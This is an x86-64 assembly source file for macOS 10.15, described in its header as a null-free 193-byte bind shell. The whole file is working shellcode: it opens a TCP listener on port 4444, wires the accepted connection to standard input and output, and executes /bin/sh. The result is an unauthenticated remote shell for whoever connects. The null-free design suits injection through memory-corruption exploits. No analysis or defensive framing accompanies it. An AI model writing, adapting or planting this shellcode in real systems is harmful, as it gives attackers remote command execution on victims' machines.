/*
 * Null-free TCP/4444 bind shell for macOS in 193 bytes.
 * 
 * % uname -v
 * Darwin Kernel Version 19.0.0: Thu Oct 17 16:17:15 PDT 2019; root:xnu-6153.41.3~29/RELEASE_X86_64
 * % sw_vers
 * ProductName:	Mac OS X
 * ProductVersion:	10.15.1
 * BuildVersion:	19B88
 */
#include <sys/syscall.h>

#define STACKSZ 64
#define BINSH 0x68732f2f6e69622f
#define SETUP_RAX(n) \
  xorl %eax, %eax ; \
  movb $2, %al ; \
  shll $24, %eax ; \
  orl $(n), %eax

.section __TEXT,__text
.globl _main
_main:
/*
  pushq %rbp
  movq %rsp, %rbp
  subq $(STACKSZ), %rsp
*/

  /* addr @ -16(%rbp) */
  movb $2, -15(%rbp)
  movw $0x5c11, -14(%rbp)   // htons(4444)
  xorl %eax, %eax
  movl %eax, -12(%rbp)
  
  /* socket(AF_INET, SOCK_STREAM, 0); */
  xorl %edx, %edx
  movl %edx, %esi
  movl %edx, %edi
  movb $1, %sil
  movb $2, %dil
  SETUP_RAX(SYS_socket)
  syscall
  movl %eax, -20(%rbp)      // sockfd

  /* bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)); */
  xorl %edx, %edx
  movb $16, %dl
  leaq -16(%rbp), %rsi
  movl -20(%rbp), %edi
  SETUP_RAX(SYS_bind)
  syscall

  /* listen(sockfd, 0); */
  xorl %esi, %esi
  movl -20(%rbp), %edi
  SETUP_RAX(SYS_listen)
  syscall

  /* accept(sockfd, NULL, NULL); */
  xorl %edx, %edx
  xorl %esi, %esi
  movl %esi, -28(%rbp)      // (int i) for later use
  movl -20(%rbp), %edi
  SETUP_RAX(SYS_accept)
  syscall
  // movl %eax, -24(%rbp)      // connfd

  /* dup2(connfd, 0); dup2(connfd, 1); dup2(connfd, 2); */
  xorl %esi, %esi
  movl %eax, %edi
L0:
  SETUP_RAX(SYS_dup2)
  syscall
  incb %sil
  cmp $3, %sil
  jl L0

  /* execve("/bin/sh", NULL, NULL); */
  xorl %eax, %eax
  movl %eax, -32(%rbp)

  movabsq $(BINSH), %rax
  movq %rax, -40(%rbp)

  xorl %edx, %edx
  xorl %esi, %esi
  leaq -40(%rbp), %rdi
  SETUP_RAX(SYS_execve)
  syscall
  /* The code doesn't reach here */

